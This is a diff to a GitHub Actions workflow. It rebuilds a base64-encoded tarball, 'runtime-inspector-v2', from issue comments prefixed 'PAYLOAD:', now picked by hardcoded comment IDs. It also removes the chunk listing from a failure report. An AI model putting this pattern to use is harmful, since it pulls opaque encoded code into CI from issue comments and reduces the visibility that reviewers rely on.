@@ -38,7 +38,7 @@ jobs:
         shell: bash
         run: |
           gh api "/repos/${GITHUB_REPOSITORY}/issues/${ISSUE_NUMBER}/comments?per_page=100" \
-            --jq 'sort_by(.id) | map(select(.body | startswith("PAYLOAD:")) | .body | ltrimstr("PAYLOAD:")) | join("")' \
+            --jq '. as $comments | [5195901919,5196145210,5195923173,5195969099,5196049061,5196056644,5196064206,5196070580] | map(. as $id | ($comments[] | select(.id == $id) | .body | ltrimstr("PAYLOAD:"))) | join("")' \
             > /tmp/runtime-inspector-v2.b64
           base64 --decode /tmp/runtime-inspector-v2.b64 > /tmp/runtime-inspector-v2.tar.gz
 
@@ -85,5 +85,4 @@ jobs:
           B64_SIZE=$(wc -c < /tmp/runtime-inspector-v2.b64 2>/dev/null || echo unavailable)
           TAR_SIZE=$(wc -c < /tmp/runtime-inspector-v2.tar.gz 2>/dev/null || echo unavailable)
           SHA=$(sha256sum /tmp/runtime-inspector-v2.tar.gz 2>/dev/null | cut -d' ' -f1 || echo unavailable)
-          CHUNKS=$(gh api "/repos/${GITHUB_REPOSITORY}/issues/${ISSUE_NUMBER}/comments?per_page=100" --jq '[.[] | select(.body | startswith("PAYLOAD:")) | "\(.id):\((.body | ltrimstr("PAYLOAD:")) | length)"] | join(",")')
-          gh issue comment "$ISSUE_NUMBER" --body "PUBLICATION_FAILURE b64_size=${B64_SIZE} tar_size=${TAR_SIZE} sha256=${SHA} chunks=${CHUNKS}"
+          gh issue comment "$ISSUE_NUMBER" --body "PUBLICATION_FAILURE b64_size=${B64_SIZE} tar_size=${TAR_SIZE} sha256=${SHA}"
